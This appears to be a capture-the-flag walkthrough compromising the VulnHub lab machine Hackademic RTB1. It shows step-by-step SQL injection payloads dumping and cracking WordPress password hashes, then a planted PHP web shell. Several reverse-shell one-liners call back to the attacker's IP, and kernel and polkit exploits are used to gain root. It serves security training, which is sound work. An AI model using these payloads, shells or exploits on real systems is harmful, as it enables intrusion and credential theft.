# __Hackademic: RTB1__
[Link to vulnhub](https://www.vulnhub.com/entry/hackademic-rtb1,17/)

## Reconnaissance
```
nmap -sS -O 192.168.175.0/24

Nmap scan report for 192.168.175.135
Host is up (0.00093s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE
22/tcp closed ssh
80/tcp open   http
MAC Address: 00:0C:29:6D:67:FE (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.22 - 2.6.36
Network Distance: 1 hop


```

## __Enumeration__
```
nmap -sV -A --script vuln -p- -v 192.168.175.135
```

After finishing Nmap scan I've found nothing useful. The open TCP port is only 80. Then let's check it out.

Found possible SQL injection on http://192.168.175.135/Hackademic_RTB1/?cat=1%' then using SQLmap to test for SQLi.
```
GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 1468 HTTP(s) requests:
---
Parameter: cat (GET)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: cat=1 AND (SELECT 3177 FROM(SELECT COUNT(*),CONCAT(0x717a786271,(SELECT (ELT(3177=3177,1))),0x7171707a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: cat=1 AND SLEEP(5)
---
```

If you use normal SQLmap options the tool will yeild only error-based and time-based blind result. But by manual checking I'v found that the page was vulnerable to union-based SQLi also.

```
http://192.168.175.135/Hackademic_RTB1/?cat=1 and 1=2 union select 1,2,3,4,5 FROM wp_categories

``` 

The following are SQLi statement and the result
* Current database
```
http://192.168.175.135/Hackademic_RTB1/?cat=1 and 1=2 union select 1,database(),3,4,5 FROM wp_categories

wordpress
```

* List database
```
http://192.168.175.135/Hackademic_RTB1/?cat=1 and 1=2 union select 1,group_concat(schema_name),3,4,5 FROM information_schema.schemata

information_schema
mysql
wordpress
```

* List table in database wordpress
```
http://192.168.175.135/Hackademic_RTB1/?cat=1 and 1=2 union select 1,group_concat(table_name),3,4,5 FROM information_schema.tables WHERE table_schema = CHAR(119, 111, 114, 100, 112, 114, 101, 115, 115)

wp_categories
wp_comments
wp_linkcategories
wp_links
wp_options
wp_post2cat
wp_postmeta
wp_posts
wp_users
```

* List column name of wp_users table
```
http://192.168.175.135/Hackademic_RTB1/?cat=1 and 1=2 union select 1,group_concat(column_name),3,4,5 FROM information_schema.columns  WHERE table_schema = CHAR(119, 111, 114, 100, 112, 114, 101, 115, 115) and table_name = CHAR(119, 112, 95, 117, 115, 101, 114, 115)

ID
user_login
user_pass
user_firstname
user_lastname
user_nickname
user_nicename
user_icq
user_email
user_url
user_ip
user_domain
user_browser
user_registered
user_level
user_aim
user_msn
user_yim
user_idmode
user_activation_key
user_status
user_description
```

* Dump user_login, user_pass, user_email, and user_level from wp_users table
```
http://192.168.175.135/Hackademic_RTB1/?cat=1 and 1=2 union select 1,group_concat(user_login,CHAR(44),user_pass,CHAR(44),user_email,CHAR(44),user_level,CHAR(59)),3,4,5 FROM wp_users

NickJames,21232f297a57a5a743894a0e4a801fc3,NickJames@hacked.com,1
JohnSmith,b986448f0bb9e5e124ca91d3d650f52c,JohnSmith@hacked,0
GeorgeMiller,7cbb3252ba6b7e9c422fac5334d22054,GeorgeMiller@hacked.com,10
TonyBlack,a6e514f9486b83cb53d8d932f9a04292,TonyBlack@hacked.com,0
JasonKonnors,8601f6e1028a8e8a966f6c33fcd9aec4,JasonKonnors@hacked.com,0
MaxBucky,50484c19f1afdaf3841a0d821ed393d2,MaxBucky@hacked.com,0

The hashes is in MD5 format so we use JohnTheRipper to crack them
NickJames:21232f297a57a5a743894a0e4a801fc3
JohnSmith:b986448f0bb9e5e124ca91d3d650f52c
GeorgeMiller:7cbb3252ba6b7e9c422fac5334d22054
TonyBlack:a6e514f9486b83cb53d8d932f9a04292
JasonKonnors:8601f6e1028a8e8a966f6c33fcd9aec4
MaxBucky:50484c19f1afdaf3841a0d821ed393d2

# john --format=raw-md5 hashes                    
Using default input encoding: UTF-8
Loaded 7 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE2 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
maxwell          (JasonKonnors)
q1w2e3           (GeorgeMiller)
napoleon         (TonyBlack)
admin            (NickJames)
PUPPIES          (JohnSmith)
kernel           (MaxBucky)
```

The user GeorgeMiller has the highest privilege in this wordpress website. It seem to be wordpress 1.5.1.1

By navigate to **Manage > Files** we could edit PHP files. I chose hello.php by adding webshell to the head of the files

The following is my web shell.
```php
<?php
if($_GET['cmd']) {
	system($_GET['cmd']);
  }
?>

<?php //The following content is old ?>
...snip...
``` 

By executing webshell: 

* Examine UID
```
http://192.168.175.135/Hackademic_RTB1/wp-content/plugins/hello.php?cmd=id

iduid=48(apache) gid=489(apache) groups=489(apache) 
```

* Examine Kernel
```
http://192.168.175.135/Hackademic_RTB1/wp-content/plugins/hello.php?cmd=uname%20-a

Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
```

* Check which PHP function is enabled
```
php -r 'print_r(get_defined_functions());' | grep -E ' (system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)'

[558] => exec
[559] => system
[562] => passthru
[563] => shell_exec
[564] => proc_open
[671] => show_source
[691] => parse_ini_file
[726] => popen
[993] => curl_exec
[1002] => curl_multi_exec

```


## __Exploit__
* Made a reverse shell
```
[-] bash -i >& /dev/tcp/192.168.175.128/9991 0>&1

[-] nc -e /bin/sh 192.168.175.128 9991

[-] rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.175.128 9991 >/tmp/f

[-] php -r '$sock=fsockopen("192.168.175.128",9991);exec("/bin/sh -i <&3 >&3 2>&3");'

[-] perl -e 'use Socket;$i="192.168.175.128";$p=9991;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

[+] python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.175.128",9991));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

root@BOEING:/tmp# nc -l -p 9991   
sh: no job control in this shell
sh-4.0$ iidd

uid=48(apache) gid=489(apache) groups=489(apache)
```

* Shell jailbreaking to TTY
```
sh-4.0$ python -c 'import pty;pty.spawn("/bin/bash")'

bash-4.0$ iidd

uid=48(apache) gid=489(apache) groups=489(apache)
bash-4.0$ ppss

  PID TTY          TIME CMD
 6469 pts/0    00:00:00 bash
 6471 pts/0    00:00:00 ps
```

## __Privilege escalation__
* Check GCC
```
bash-4.0$ ggcccc  --vv

Using built-in specs.
Target: i686-redhat-linux
Configured with: ../configure --prefix=/usr --mandir=/usr/share/man --infodir=/usr/share/info --with-bugurl=http://bugzilla.redhat.com/bugzilla --enable-bootstrap --enable-shared --enable-threads=posix --enable-checking=release --with-system-zlib --enable-__cxa_atexit --disable-libunwind-exceptions --enable-gnu-unique-object --enable-languages=c,c++,objc,obj-c++,java,fortran,ada --enable-java-awt=gtk --disable-dssi --enable-plugin --with-java-home=/usr/lib/jvm/java-1.5.0-gcj-1.5.0.0/jre --enable-libgcj-multifile --enable-java-maintainer-mode --with-ecj-jar=/usr/share/java/eclipse-ecj.jar --disable-libjava-multilib --with-ppl --with-cloog --with-tune=generic --with-arch=i686 --build=i686-redhat-linux
Thread model: posix
gcc version 4.4.4 20100630 (Red Hat 4.4.4-10) (GCC) 
```

* Kernel check
```
bash-4.0$ uunnaammee  --aa

Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux

bash-4.0$  cat /etc/issue cat /etc/issue

Fedora release 12 (Constantine)
Kernel \r on an \m (\l)
```

* Possible kernel  exploit
	* [Full nelson](https://www.exploit-db.com/exploits/15704/)
	* [Dirty cow](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)

* Checking files
	* /etc/passwd
```
bash-4.0$ ccaatt  //eettcc//ppaasssswwdd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
vcsa:x:69:499:virtual console memory owner:/dev:/sbin/nologin
avahi-autoipd:x:499:498:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
rtkit:x:498:494:RealtimeKit:/proc:/sbin/nologin
nscd:x:28:493:NSCD Daemon:/:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
avahi:x:497:492:avahi-daemon:/var/run/avahi-daemon:/sbin/nologin
haldaemon:x:68:491:HAL daemon:/:/sbin/nologin
openvpn:x:496:490:OpenVPN:/etc/openvpn:/sbin/nologin
apache:x:48:489:Apache:/var/www:/sbin/nologin
saslauth:x:495:488:"Saslauthd user":/var/empty/saslauth:/sbin/nologin
mailnull:x:47:487::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:486::/var/spool/mqueue:/sbin/nologin
smolt:x:494:485:Smolt:/usr/share/smolt:/sbin/nologin
sshd:x:74:484:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
pulse:x:493:483:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
gdm:x:42:481::/var/lib/gdm:/sbin/nologin
p0wnbox.Team:x:500:500:p0wnbox.Team:/home/p0wnbox.Team:/bin/bash
mysql:x:27:480:MySQL Server:/var/lib/mysql:/bin/bash
```

* SUID set files
```
bash-4.0$ find / -perm -u=s -type f 2>/dev/nullfind / -perm -u=s -type f 2>/dev/null

/usr/libexec/openssh/ssh-keysign
/usr/libexec/pt_chown
/usr/libexec/pulse/proximity-helper
/usr/libexec/polkit-1/polkit-agent-helper-1
/usr/sbin/userhelper
/usr/sbin/suexec
/usr/sbin/ccreds_chkpwd
/usr/sbin/usernetctl
/usr/lib/nspluginwrapper/plugin-config
/usr/bin/crontab
/usr/bin/gpasswd
/usr/bin/sudoedit
/usr/bin/chage
/usr/bin/chfn
/usr/bin/at
/usr/bin/Xorg
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/abrt-pyhook-helper
/sbin/unix_chkpwd
/sbin/pam_timestamp_check
/lib/dbus-1/dbus-daemon-launch-helper
/bin/umount
/bin/fusermount
/bin/mount
/bin/su
/bin/ping6
/bin/ping
```

* Escalate privilege using FullNelson (Failed)
```
[Full nelson](https://www.exploit-db.com/exploits/15704/)
vi 15704.c
gcc 15704.c -o 15704
chmod +x 15704
./15704

bash-4.0$ ./15704./15704

[*] Failed to open file descriptors.
bash-4.0$ ./15704./15704

[*] Failed to open file descriptors.
bash-4.0$ ./15704./15704

[*] Failed to open file descriptors.
```

* Escalate privilege using Dirtycow (Failed)
```
[Dirty cow](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
Using cowroot
vi cowroot.c
gcc cowroot.c -o cowroot -lpthread
bash-4.0$ gcc cowroot.c -o cowroot -lpthread

cowroot.c: In function 'procselfmemThread':
cowroot.c:98: warning: passing argument 2 of 'lseek' makes integer from pointer without a cast
/usr/include/unistd.h:331: note: expected '__off_t' but argument is of type 'void *'
cowroot.c: In function 'main':
cowroot.c:141: error: invalid use of undefined type 'struct stat'
cowroot.c:143: error: invalid use of undefined type 'struct stat'
cowroot.c:144: error: invalid use of undefined type 'struct stat'
cowroot.c:147: error: invalid use of undefined type 'struct stat'
bash-4.0$ 
```

* polkit-pwnage.c (Work!) (CVE-2011-1485) - https://git.zx2c4.com/CVE-2011-1485/tree/polkit-pwnage.c
```
$ pkexec --version
pkexec version 0.95

vi polkit-pwnage.c
gcc polkit-pwnage.c -o polkit-pwnage
chmod +x polkit-pwnage
./polkit-pwnage

bash-4.0$ ./polkit-pwnage

=============================
=      PolicyKit Pwnage     =
=          by zx2c4         =
=        Sept 2, 2011       =
=============================

[+] Configuring inotify for proper pid.
[+] Launching pkexec.
sh-4.0# id

uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
sh-4.0# 
sh-4.0# cat key.txt
Yeah!!
You must be proud because you 've got the password to complete the First *Realistic* Hackademic Challenge (Hackademic.RTB1) :)

$_d&jgQ>>ak\#b"(Hx"o<la_%

Regards,
mr.pr0n || p0wnbox.Team || 2011
http://p0wnbox.com

sh-4.0# 
```

* 15285.c (Work!) (CVE-2010-3904) - https://www.exploit-db.com/exploits/15285/
```
vi 15285.c
gcc 15285.c -o 15285
chmod +x 15285
./15285

bash-4.0$ ./15285

[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc0aa19ac
 [+] Resolved default_security_ops to 0xc0955c6c
 [+] Resolved cap_ptrace_traceme to 0xc055d9d7
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
[*] Got root!
sh-4.0# iidd

uid=0(root) gid=0(root)
sh-4.0# 

```